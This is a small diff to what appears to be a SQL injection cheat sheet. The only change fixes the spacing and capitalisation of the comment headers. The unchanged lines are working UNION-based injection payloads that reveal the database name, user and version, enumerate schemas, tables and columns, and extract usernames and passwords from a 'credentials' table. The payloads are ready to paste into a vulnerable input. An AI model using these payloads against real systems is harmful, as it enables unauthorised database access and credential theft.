@@ -25,8 +25,8 @@ aaa' UNION SELECT 1,database(),user(),@@version-- -
 cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 # Tables
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
-#COlumns
+# Columns
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
-#Data
+# Data
 cn' UNION select 1, username, password, 4 from dev.credentials-- -
 ```
